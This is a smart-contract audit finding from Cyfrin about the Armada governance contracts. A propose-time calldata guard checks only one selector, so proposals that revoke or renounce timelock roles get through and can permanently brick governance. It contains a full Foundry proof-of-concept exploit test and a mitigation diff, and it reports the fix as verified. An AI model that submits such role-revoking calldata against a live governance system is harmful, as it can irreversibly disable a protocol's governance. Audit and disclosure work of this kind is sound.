---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-05-13-cyfrin-armada-crowdfund-governance-v2-0-1-9
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2026-05-13T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-13-cyfrin-armada-crowdfund-governance-v2.0.md
tags:
- firm:cyfrin
- report:2026-05-13-cyfrin-armada-crowdfund-governance-v2-0
title: Timelock role-management calldata bypasses `ArmadaGovernor::_validateTimelockCalldata`
  which can brick governance
vuln_class: []
---

# Timelock role-management calldata bypasses `ArmadaGovernor::_validateTimelockCalldata` which can brick governance

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-05-13-cyfrin-armada-crowdfund-governance-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-13-cyfrin-armada-crowdfund-governance-v2.0.md)_

---

**Description:** `ArmadaGovernor::_validateTimelockCalldata` (`contracts/governance/ArmadaGovernor.sol:1236-1252`) is a propose-time guard that inspects calldata only when the selector matches `UPDATE_DELAY_SELECTOR`:

```solidity
if (bytes4(calldatas[i]) != UPDATE_DELAY_SELECTOR) continue;
```

Any other timelock-targeting calldata bypasses the guard entirely. The dev's comment at `:208-213` acknowledges the guard is "governor-scoped" and that `PROPOSER_ROLE on the timelock is held ONLY by this governor` is a load-bearing assumption, but the guard does not extend to defend that assumption against revocation or to defend the parallel `EXECUTOR_ROLE` / `CANCELLER_ROLE` / `TIMELOCK_ADMIN_ROLE` invariants.

**Impact:** Governance can be bricked via four timelock self-call calldata shapes pass the guard and produce recovery-closed states under the production role layout (`scripts/deploy_crowdfund.ts:332` renounces `TIMELOCK_ADMIN_ROLE` from the deployer, leaving only the timelock self with admin; the timelock can only act via the `PROPOSER+EXECUTOR` cycle that some of these revocations break):

1. `timelock.revokeRole(PROPOSER_ROLE, governor)` - every `governor.queue()` reverts on OZ AccessControl's `onlyRole(PROPOSER_ROLE)` at `scheduleBatch`.
2. `timelock.revokeRole(EXECUTOR_ROLE, governor)` - every `governor.execute()` reverts on `onlyRoleOrOpenRole(EXECUTOR_ROLE)` at `executeBatch`. Queued proposals are stuck in `Queued` state forever.
3. `timelock.revokeRole(CANCELLER_ROLE, governor)` - `governor.veto()` reverts at the inner `timelock.cancel(timelockId)` call (line 587), which has `onlyRole(CANCELLER_ROLE)`. Normal governance still works but the SC veto safety net is gone.
4. `timelock.renounceRole(TIMELOCK_ADMIN_ROLE, timelock)` - executes via timelock self-call (msg.sender == account == timelock satisfies OZ's renounce guard). Standalone effect: future `grantRole`/`revokeRole` calls all revert. Combined with any of (1)-(3): no on-chain path to ever restore the revoked role.

**Proof of Concept:** Add the following test to `test-foundry/solace-pocs/PoC_GovernorBrickViaTimelockRoleRevoke.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
// ABOUTME: PoC - the propose-time guard at `_validateTimelockCalldata` is a per-selector
// ABOUTME: allowlist with one entry (`UPDATE_DELAY_SELECTOR`); four other timelock self-call
// ABOUTME: calldata shapes have the same brick effect on different governance functions.
// ABOUTME: Demonstrates the gap and verifies recovery is closed for each variant.
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../contracts/governance/ArmadaGovernor.sol";
import "../../contracts/governance/ArmadaToken.sol";
import "../../contracts/governance/ArmadaTreasuryGov.sol";
import "../../contracts/governance/IArmadaGovernance.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";
import "../helpers/GovernorDeployHelper.sol";

contract PoC_GovernorBrickViaTimelockRoleRevoke is Test, GovernorDeployHelper {
    ArmadaGovernor public governor;
    ArmadaToken public armToken;
    TimelockController public timelock;
    ArmadaTreasuryGov public treasury;

    address public deployer = address(this);
    address public alice = address(0xA11CE);
    address public sc_a = address(0x5C00A);

    uint256 constant TOTAL_SUPPLY = 12_000_000e18;
    uint256 constant TWO_DAYS = 2 days;

    bytes32 PROPOSER_ROLE;
    bytes32 EXECUTOR_ROLE;
    bytes32 CANCELLER_ROLE;
    bytes32 ADMIN_ROLE;

    function setUp() public {
        address[] memory empty = new address[](0);
        timelock = new TimelockController(TWO_DAYS, empty, empty, deployer);
        armToken = new ArmadaToken(deployer, address(timelock));
        treasury = new ArmadaTreasuryGov(address(timelock));
        governor = _deployGovernorProxy(address(armToken), payable(address(timelock)), address(treasury));

        address[] memory whitelist = new address[](2);
        whitelist[0] = deployer;
        whitelist[1] = alice;
        armToken.initWhitelist(whitelist);

        armToken.transfer(alice, TOTAL_SUPPLY * 50 / 100);
        vm.prank(alice);
        armToken.delegate(alice);
        vm.roll(block.number + 1);

        PROPOSER_ROLE = timelock.PROPOSER_ROLE();
        EXECUTOR_ROLE = timelock.EXECUTOR_ROLE();
        CANCELLER_ROLE = timelock.CANCELLER_ROLE();
        ADMIN_ROLE = timelock.TIMELOCK_ADMIN_ROLE();

        // Mirror production deploy_governance.ts:266-272 - all three roles to governor.
        timelock.grantRole(PROPOSER_ROLE, address(governor));
        timelock.grantRole(EXECUTOR_ROLE, address(governor));
        timelock.grantRole(CANCELLER_ROLE, address(governor));

        // Mirror production deploy_crowdfund.ts:332 - deployer renounces ADMIN.
        // After this, only the timelock self holds TIMELOCK_ADMIN_ROLE.
        timelock.renounceRole(ADMIN_ROLE, deployer);

        // Set initial SC for veto-related test.
        vm.prank(address(timelock));
        governor.setSecurityCouncil(sc_a);
    }

    function test_PoC_RevokeProposerRole_BricksQueue() public {
        // propose() accepts the bad calldata - guard only blocks UPDATE_DELAY_SELECTOR.
        bytes memory bad = abi.encodeWithSelector(
            timelock.revokeRole.selector, PROPOSER_ROLE, address(governor)
        );
        uint256 attackId = _proposeTimelockCalldata(bad, "revoke PROPOSER_ROLE");
        (, ProposalType t, , , , , , , ) = governor.getProposal(attackId);
        assertEq(uint256(t), uint256(ProposalType.Extended), "fail-closed routes to Extended");

        // Model the post-execute state via timelock self-prank.
        vm.prank(address(timelock));
        timelock.revokeRole(PROPOSER_ROLE, address(governor));
        assertFalse(timelock.hasRole(PROPOSER_ROLE, address(governor)), "post: governor lost PROPOSER_ROLE");

        // queue() reverts on OZ AccessControl missing-role check.
        uint256 newId = _proposeStandardInnocuous("post-brick standard");
        _voteAndAdvance(newId);
        vm.expectRevert();
        governor.queue(newId);

        _assertRoleRecoveryClosed(PROPOSER_ROLE, address(governor));
    }

    function test_PoC_RevokeExecutorRole_BricksExecute() public {
        // Queue an innocuous proposal P normally (governor still has all roles).
        uint256 pid = _proposeStandardInnocuous("P queued before EXECUTOR revoke");
        _voteAndAdvance(pid);
        governor.queue(pid);
        assertEq(uint256(governor.state(pid)), uint256(ProposalState.Queued), "P Queued");

        // Revoke EXECUTOR_ROLE.
        vm.prank(address(timelock));
        timelock.revokeRole(EXECUTOR_ROLE, address(governor));

        // P's execution-delay elapses; execute() reverts.
        vm.warp(block.timestamp + TWO_DAYS + 1);
        vm.expectRevert();
        governor.execute(pid);
        assertEq(uint256(governor.state(pid)), uint256(ProposalState.Queued),
            "P stuck Queued forever - no execute path");

        _assertRoleRecoveryClosed(EXECUTOR_ROLE, address(governor));
    }

    function test_PoC_RevokeCancellerRole_BricksSCVeto() public {
        uint256 pid = _proposeStandardInnocuous("P queued, awaiting SC veto");
        _voteAndAdvance(pid);
        governor.queue(pid);

        vm.prank(address(timelock));
        timelock.revokeRole(CANCELLER_ROLE, address(governor));

        // governor.veto -> timelock.cancel reverts on missing CANCELLER_ROLE.
        vm.prank(sc_a);
        vm.expectRevert();
        governor.veto(pid, keccak256("bad proposal"));

        _assertRoleRecoveryClosed(CANCELLER_ROLE, address(governor));
    }

    function test_PoC_RenounceAdminRole_ClosesAllFutureRoleGrants() public {
        // Pre-state: only the timelock self holds ADMIN.
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)), "pre: timelock self holds ADMIN");

        // Renounce via timelock self-call (msg.sender == account satisfies OZ guard).
        vm.prank(address(timelock));
        timelock.renounceRole(ADMIN_ROLE, address(timelock));
        assertFalse(timelock.hasRole(ADMIN_ROLE, address(timelock)), "post: no one holds ADMIN");

        // Future grant attempts revert from every actor.
        vm.prank(alice);
        vm.expectRevert();
        timelock.grantRole(PROPOSER_ROLE, alice);

        vm.prank(deployer);
        vm.expectRevert();
        timelock.grantRole(PROPOSER_ROLE, alice);

        vm.prank(address(timelock));
        vm.expectRevert();
        timelock.grantRole(PROPOSER_ROLE, alice);

        // Existing governance continues to function.
        uint256 pid = _proposeStandardInnocuous("post-renounce, gov still works");
        _voteAndAdvance(pid);
        governor.queue(pid);
        assertEq(uint256(governor.state(pid)), uint256(ProposalState.Queued),
            "Existing PROPOSER_ROLE still allows queue post-renounce");
    }

    // ======== Helpers ========

    function _proposeStandardInnocuous(string memory desc) internal returns (uint256) {
        address[] memory targets = new address[](1); targets[0] = address(0xDEAD);
        uint256[] memory values  = new uint256[](1);
        bytes[]   memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("setRevenueThreshold(uint256)", uint256(1));
        vm.prank(alice);
        return governor.propose(ProposalType.Standard, targets, values, calldatas, desc);
    }

    function _proposeTimelockCalldata(bytes memory data, string memory desc) internal returns (uint256) {
        address[] memory targets = new address[](1); targets[0] = address(timelock);
        uint256[] memory values  = new uint256[](1);
        bytes[]   memory calldatas = new bytes[](1); calldatas[0] = data;
        vm.prank(alice);
        return governor.propose(ProposalType.Standard, targets, values, calldatas, desc);
    }

    function _voteAndAdvance(uint256 proposalId) internal {
        (, , uint256 voteStart, uint256 voteEnd, , , , , ) = governor.getProposal(proposalId);
        if (block.timestamp <= voteStart) vm.warp(voteStart + 1);
        vm.prank(alice);
        governor.castVote(proposalId, 1);
        if (block.timestamp <= voteEnd) vm.warp(voteEnd + 1);
    }

    function _assertRoleRecoveryClosed(bytes32 role, address account) internal {
        vm.prank(alice);
        vm.expectRevert();
        timelock.grantRole(role, account);

        vm.prank(deployer);
        vm.expectRevert();
        timelock.grantRole(role, account);

        bytes memory recoveryCalldata = abi.encodeWithSelector(
            timelock.grantRole.selector, role, account
        );
        vm.prank(alice);
        vm.expectRevert();
        timelock.schedule(address(timelock), 0, recoveryCalldata, bytes32(0), bytes32(uint256(1)), 8 days);
    }
}
```

Run with: `forge test --match-path test-foundry/solace-pocs/PoC_GovernorBrickViaTimelockRoleRevoke.t.sol -vv`

Four tests, one per variant. Each demonstrates: (a) the post-execute state under the production role layout, (b) the function that bricks (queue / execute / veto / future-grant), and (c) that recovery is closed - direct `grantRole` reverts from every actor and direct `timelock.schedule` reverts because the only entity that could schedule is the now-bricked governor.

**Recommended Mitigation:** Extend `_validateTimelockCalldata`'s allowlist to defend the role-membership invariants the comment at `:208-213` already names. Block the four self-destructive calldata shapes at propose time so they never reach voting:

```diff
+    bytes4 public constant REVOKE_ROLE_SELECTOR = bytes4(keccak256("revokeRole(bytes32,address)"));
+    bytes4 public constant RENOUNCE_ROLE_SELECTOR = bytes4(keccak256("renounceRole(bytes32,address)"));

+    function _isGovernorRequiredRole(bytes32 role) internal view returns (bool) {
+        return role == timelock.PROPOSER_ROLE()
+            || role == timelock.EXECUTOR_ROLE()
+            || role == timelock.CANCELLER_ROLE();
+    }

 function _validateTimelockCalldata(address[] memory targets, bytes[] memory calldatas) internal view {
     for (uint256 i; i < targets.length; i++) {
         if (targets[i] != address(timelock)) continue;
-        if (calldatas[i].length < 36) continue;
-        if (bytes4(calldatas[i]) != UPDATE_DELAY_SELECTOR) continue;
-        // existing updateDelay cap...
+        if (calldatas[i].length < 4) continue;
+        bytes4 sel = bytes4(calldatas[i]);
+
+        if (sel == UPDATE_DELAY_SELECTOR && calldatas[i].length >= 36) {
+            // existing updateDelay cap...
+            continue;
+        }
+
+        if (sel == REVOKE_ROLE_SELECTOR && calldatas[i].length >= 4 + 32 + 32) {
+            (bytes32 role, address account) = _decodeRoleArgs(calldatas[i]);
+            if (account == address(this) && _isGovernorRequiredRole(role)) {
+                revert Gov_CannotRevokeGovernorRole(role);
+            }
+        }
+
+        if (sel == RENOUNCE_ROLE_SELECTOR && calldatas[i].length >= 4 + 32 + 32) {
+            (bytes32 role, address account) = _decodeRoleArgs(calldatas[i]);
+            if (account == address(timelock) && role == timelock.TIMELOCK_ADMIN_ROLE()) {
+                revert Gov_CannotRenounceTimelockAdmin();
+            }
+        }
     }
 }
```

Update the comment at `:208-213` to enumerate the full set of defended assumptions: `_minDelay <= smallest queueable executionDelay`, `governor retains PROPOSER/EXECUTOR/CANCELLER on the timelock`, `timelock self retains TIMELOCK_ADMIN_ROLE`. Document that any future role-management enhancement (adding a backup proposer, etc.) must intentionally bypass the guard via a separate code path that re-evaluates the invariants rather than relying on the same propose-time pipeline.

A complementary alternative (or addition for defense in depth) is to grant a backup PROPOSER_ROLE / EXECUTOR_ROLE to a multisig at deployment so cardinality is never one. The propose-time guard remains the cheaper fix because it does not change the role-cardinality assumption the rest of the codebase makes.

**Armada:** Fixed in commits [28ca386](https://github.com/ship-armada/armada-poc/commit/28ca38633d1493254b2204e7230c969223bb64f4), [bb1dfef](https://github.com/ship-armada/armada-poc/commit/bb1dfefca85878d2e108da728dc6b36c5d2e1280).

**Cyfrin:** Verified.

\clearpage
